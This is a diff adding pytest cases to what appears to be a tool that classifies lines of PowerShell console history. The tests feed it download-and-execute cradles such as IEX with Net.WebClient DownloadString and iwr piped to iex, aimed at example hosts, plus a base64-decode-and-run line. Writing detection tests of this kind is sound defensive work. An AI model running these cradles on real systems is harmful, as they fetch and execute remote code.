@@ -65,6 +65,34 @@ def test_a_line_the_rule_describes_whole_is_not_partial(parse_text, resolver, te
     assert gloss.source == "rule" and gloss.partial is None
 
 
+# A download cradle already says the code runs: the URL in DownloadString(...) or a variable in it is part of the
+# cradle, not another command (0.1.1 marked these partial). A later pipeline stage is still another command (a
+# statement after ; is a line of its own).
+CRADLE = "IEX (New-Object Net.WebClient).DownloadString("
+
+
+@pytest.mark.parametrize("text", [
+    CRADLE + "'http://203.0.113.5/a.ps1')",
+    CRADLE + '"http://$ip/a.ps1")',
+    "IEX(New-Object Net.WebClient).DownloadString($u)",
+    "iex (irm https://example.com/p.ps1)",
+    "iwr https://example.com/p.ps1 -UseBasicParsing | iex",
+    "IEX (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing).Content",
+])
+def test_a_powershell_cradle_is_not_partial(parse_text, resolver, text):
+    gloss = glossed(parse_text, resolver, text + "\n", name="ConsoleHost_history.txt").lines[0].gloss
+    assert gloss.rule_id == "powershell-download-cradle" and gloss.partial is None, gloss.partial
+
+
+@pytest.mark.parametrize("text, word", [
+    (CRADLE + "'http://203.0.113.5/a.ps1') | Out-File C:/Users/Public/o.txt", "out-file"),
+    ("iwr https://example.com/p.ps1 | iex | Set-Content o.txt", "set-content"),
+])
+def test_a_command_after_a_powershell_cradle_is_still_partial(parse_text, resolver, text, word):
+    gloss = glossed(parse_text, resolver, text + "\n", name="ConsoleHost_history.txt").lines[0].gloss
+    assert gloss.rule_id == "powershell-download-cradle" and word in (gloss.partial or ""), gloss.partial
+
+
 def test_a_partial_reason_never_echoes_odd_command_text(parse_text, resolver):
     gloss = glossed(parse_text, resolver, "echo aWQ= | base64 -d | ./'<b>x</b>'\n").lines[0].gloss
     assert gloss.partial is not None and "<" not in gloss.partial and "another command" in gloss.partial
